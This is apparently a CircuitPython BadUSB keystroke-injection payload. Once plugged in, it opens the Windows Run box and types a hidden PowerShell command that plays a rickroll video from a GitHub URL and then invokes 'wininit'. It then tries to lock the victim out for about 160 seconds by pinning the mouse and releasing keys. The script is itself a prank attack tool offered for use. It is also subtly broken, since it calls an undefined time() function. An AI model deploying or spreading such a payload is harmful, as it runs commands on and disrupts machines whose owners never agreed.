#PiNinja Payload Script
#Title:
#Description:

#Imports
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.mouse import Mouse
from adafruit_hid.keycode import Keycode as key
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from time import sleep
#Varibales
kbd = Keyboard(usb_hid.devices)
lay = KeyboardLayoutUS(kbd)
mse = Mouse(usb_hid.devices)

def main():
    
    #Rickroll
    kbd.send(key.GUI, key.R)
    sleep(0.1)
    lay.write('powershell -w hidden "start https://H4K0N42.github.io/nggyu/video.webm; timeout /NOBREAK /t 20; wininit"')
    enter()
  
    #If you are a good person comment this line out
    blockInput(2 * 60 + 40)
    
    
    
    
def enter():
    kbd.send(key.ENTER)
    
def blockInput(duration):
    screen_width = 1920
    screen_height = 1080
    
    end_time = time() + duration
     
    while time() < end_time:
        mse.move(x=int(screen_width / 2), y=int(screen_height / 2))
        kbd.release_all()


main()
